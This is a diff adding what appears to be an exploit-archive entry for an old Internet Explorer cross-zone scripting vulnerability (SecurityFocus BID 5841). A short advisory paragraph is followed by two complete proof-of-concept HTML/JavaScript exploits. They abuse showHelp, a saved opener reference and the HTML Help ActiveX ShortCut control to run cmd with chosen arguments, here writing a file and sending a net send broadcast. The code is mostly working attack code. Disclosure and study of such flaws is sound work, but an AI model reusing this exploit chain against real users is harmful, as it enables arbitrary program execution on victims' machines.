@@ -1,0 +1,72 @@
+source: http://www.securityfocus.com/bid/5841/info
+
+A vulnerability has been reported in Microsoft Internet Explorer that may allow for remote attackers to execute script code in the context of other domains/security Zones. The cause appears to be a lack of access control checks when access to a document object is attempted through a saved reference to it. Exploitation of this vulnerability may allow for theft of cookie information, website impersonation or disclosure of local files.
+
+It may also be possible to execute local programs with parameters through this vulnerability. Note that this may also be possible for attackers to do this with other, similar vulnerabilities that permit cross-zone scripting. See References and Exploits sections for details and proof of concept demonstration 
+
+<script>
+// "How to execute programs with parameters in IE", 2002-11-06
+// Sandblad advisory #10, Andreas Sandblad, sandblad@acc.umu.se
+prog = 'cmd';
+args = '/k echo You are vulnerable (Sandblad #10) & '+
+'echo Sandblad #10 > c:/vulnerable.txt & winmine';
+
+if (!location.hash) {
+showHelp(location+"#1");
+showHelp("iexplore.chm");
+blur();
+}
+else if (location.hash == "#1")
+open(location+"2").blur();
+else {
+f = opener.location.assign;
+opener.location="res:";
+f("javascript:location.replace('mk:@MSITStore:C:')");
+setTimeout('run()',1000);
+}
+function run() {
+f("javascript:document.write('<object id=c1 classid=clsid:adb"+
+"880a6-d8ff-11cf-9377-00aa003b7a11><param name=Command value"+
+"=ShortCut><param name=Item1 value=\","+prog+","+args+"\"></"+
+"object><object id=c2 classid=clsid:adb880a6-d8ff-11cf-9377"+
+"-00aa003b7a11><param name=Command value=Close></object>')");
+f("javascript:c1.Click();c2.Click();");
+close();
+}
+</script>
+
+The following proof of concept was made available by Gert Fokkema <gert@why4.com>:
+
+<HTML>
+<BODY>
+<script>
+// "How to execute programs with parameters in IE", 2002-11-06
+// Sandblad advisory #10, Andreas Sandblad, sandblad@acc.umu.se
+prog = 'cmd';
+args = '/k net send * ..HELP..MY..COMPUTER..IS..HACKED..';
+
+if (!location.hash) {
+showHelp(location+"#1");
+showHelp("iexplore.chm");
+blur();
+}
+else if (location.hash == "#1")
+open(location+"2").blur();
+else {
+f = opener.location.assign;
+opener.location="res:";
+f("javascript:location.replace('mk:@MSITStore:C:')");
+setTimeout('run()',1000);
+}
+function run() {
+f("javascript:document.write('<object id=c1 classid=clsid:adb"+
+"880a6-d8ff-11cf-9377-00aa003b7a11><param name=Command value"+
+"=ShortCut><param name=Item1 value=\","+prog+","+args+"\"></"+
+"object><object id=c2 classid=clsid:adb880a6-d8ff-11cf-9377"+
+"-00aa003b7a11><param name=Command value=Close></object>')");
+f("javascript:c1.Click();c2.Click();");
+close();
+}
+</script>
+</BODY>
+</HTML> 
